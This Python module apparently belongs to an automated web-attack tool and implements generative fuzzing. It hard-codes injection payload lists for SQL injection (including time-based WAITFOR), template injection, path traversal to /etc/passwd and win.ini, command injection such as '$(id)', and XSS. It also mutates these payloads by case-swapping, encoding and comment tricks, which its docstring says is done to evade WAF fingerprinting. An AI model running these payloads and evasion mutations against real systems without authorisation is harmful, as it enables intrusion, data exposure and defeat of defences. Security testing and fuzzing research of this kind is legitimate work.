"""
phantom.automation.brain.fuzz — generative fuzzing with differential oracles.

Template probes (the hunt engine's fixed payloads) are signatures a WAF
fingerprints in one request. Generative fuzzing instead MUTATES a grammar
of input primitives and compares response DIFFERENTIALS: what matters is
not any single payload, but the difference in behaviour between a baseline
and its mutations.

    grammar.py   — input primitives and mutation strategies
    oracles.py   — differential oracles (reflective, error-based,
                   time-based, state-changing)
    engine.py    — the driver: baseline -> mutations -> oracle verdicts
"""

from __future__ import annotations

import random
import string
from dataclasses import dataclass, field
from typing import Dict, List, Optional

# ── primitive payload families ─────────────────────────────────────────────

SQLI_TOKENS = ["'", '"', "' OR '1'='1", "1' ORDER BY 7--", "1 UNION SELECT {n}--",
               "1; WAITFOR DELAY '0:0:{t}'--", "1 AND (SELECT {n} FROM DUAL)='{v}'"]
SSTI_TOKENS = ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{7*'7'}}",
               "${{7*7}}", "#{ {7*7} }"]
PATH_TOKENS = ["../../etc/passwd", "..%2f..%2fetc%2fpasswd", "%2e%2e%2fetc/passwd",
               "....//....//etc/passwd", "..%252fetc%2fpasswd",
               "\\\\..\\..\\windows\\win.ini"]
CMDI_TOKENS = ["; id", "| id", "`id`", "$(id)", "& dir", "\nid", "%0aid"]
XSS_TOKENS = ["<svg/onload=alert(1)>", "\"><script>alert(1)</script>",
              "javascript:alert(1)", "<img src=x onerror=alert(1)>"]

FAMILIES: Dict[str, List[str]] = {
    "sqli": SQLI_TOKENS, "ssti": SSTI_TOKENS, "path": PATH_TOKENS,
    "cmdi": CMDI_TOKENS, "xss": XSS_TOKENS,
}

# markers that reveal true results inside reflected output
_CANARIES = string.ascii_lowercase[:8]


@dataclass
class Mutation:
    """One generated input candidate."""
    family: str
    payload: str
    param: str
    generation: int = 0          # which mutation round produced it
    parent: str = ""             # the payload it mutated from

    def to_dict(self) -> dict:
        return {"family": self.family, "param": self.param,
                "payload": self.payload[:80], "gen": self.generation}


class Grammar:
    """Generates and evolves candidate payloads for one parameter."""

    def __init__(self, families: Optional[List[str]] = None,
                 seed: Optional[int] = None) -> None:
        self.families = families or list(FAMILIES)
        self._rng = random.Random(seed)

    def seed_payloads(self, params: List[str]) -> List[Mutation]:
        """Round 0: one baseline probe per family per param. Every token
        of every family is seeded — the time-based WAITFOR/SLEEP probes
        live deeper in the family lists and must not be cut by a fixed
        take(2) (they were the exact payloads the oracle needed)."""
        out: List[Mutation] = []
        for param in params:
            for fam in self.families:
                for tok in FAMILIES[fam]:
                    out.append(Mutation(fam, tok, param))
        return out

    def evolve(self, interesting: List[Mutation]) -> List[Mutation]:
        """Round N: mutate the interesting candidates of the last round."""
        out: List[Mutation] = []
        for m in interesting:
            for _ in range(3):                    # bounded fan-out
                payload = self._mutate(m.payload)
                out.append(Mutation(m.family, payload, m.param,
                                    generation=m.generation + 1,
                                    parent=m.payload))
        return out

    # ── mutation operators ─────────────────────────────────────────────
    def _mutate(self, payload: str) -> str:
        ops = [self._case_swap, self._encode, self._pad, self._nest,
               self._comment_break, self._canary_wrap]
        return self._rng.choice(ops)(payload)

    def _case_swap(self, p: str) -> str:
        return "".join(c.upper() if self._rng.random() < 0.5 else c
                       for c in p)

    def _encode(self, p: str) -> str:
        enc = self._rng.choice([
            lambda s: s.replace(" ", "/**/"),
            lambda s: s.replace(" ", "%20"),
            lambda s: s.replace("/", "%2f"),
            lambda s: s.replace(".", "%2e"),
            lambda s: "".join(f"%{ord(c):02x}" for c in s[:6]) + s[6:],
        ])
        return enc(p)

    def _pad(self, p: str) -> str:
        pad = self._rng.choice([" ", "\t", "\n", "/**/", "%00", " " * 3])
        return f"{p}{pad}"

    def _nest(self, p: str) -> str:
        return p.replace("..", "....", 1) if ".." in p else p * 2

    def _comment_break(self, p: str) -> str:
        return p.replace("--", "#", 1) if "--" in p else p + "--"

    def _canary_wrap(self, p: str) -> str:
        # wrap numeric probes with distinct digits so reflected values
        # prove WHICH expression evaluated
        return p.replace("7", "1337", 1)
